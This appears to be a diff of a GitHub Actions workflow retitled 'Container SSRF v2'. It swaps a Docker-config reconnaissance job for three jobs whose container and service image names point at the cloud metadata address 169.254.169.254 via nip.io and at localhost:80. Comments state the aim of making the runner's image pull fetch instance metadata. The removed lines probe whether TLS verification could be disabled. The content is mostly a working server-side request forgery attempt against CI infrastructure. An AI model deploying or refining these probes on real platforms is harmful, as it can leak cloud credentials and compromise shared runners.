@@ -1,18 +1,29 @@
-name: Check Docker Config
+name: Container SSRF v2
 on: workflow_dispatch
 jobs:
-  check:
+  # Test 1: container key with port 80 (BuildKit HTTP fallback?)
+  container-test:
     runs-on: ubuntu-latest
+    container:
+      image: 169.254.169.254.nip.io:80/metadata/instance
     steps:
-      - name: Check Docker daemon config
-        run: |
-          echo "=== Current daemon.json ==="
-          cat /etc/docker/daemon.json 2>&1 || echo "NO daemon.json"
-          echo "=== Docker info ==="
-          docker info 2>&1 | grep -i "insecure\|registry\|server"
-          echo "=== Can we modify daemon.json before services start? ==="
-          echo "Services and container pulls happen BEFORE steps"
-          echo "So we cannot modify daemon.json in time"
-          echo ""
-          echo "=== BUT: what about DOCKER_HOST and DOCKER_TLS_VERIFY? ==="
-          echo "If we set DOCKER_TLS_VERIFY=0 in env, does it affect the pull?"
+      - run: echo "If you see this, the container started"
+
+  # Test 2: services key with port 80
+  services-test:
+    runs-on: ubuntu-latest
+    services:
+      metadata-svc:
+        image: 169.254.169.254.nip.io:80/latest/meta-data
+    steps:
+      - run: echo "Service test"
+
+  # Test 3: What about .nip.io without port?
+  # Docker defaults to HTTPS, which times out on metadata
+  # But can we use a hostname that Docker treats as local?
+  local-test:
+    runs-on: ubuntu-latest
+    container:
+      image: localhost:80/test
+    steps:
+      - run: echo "localhost test"
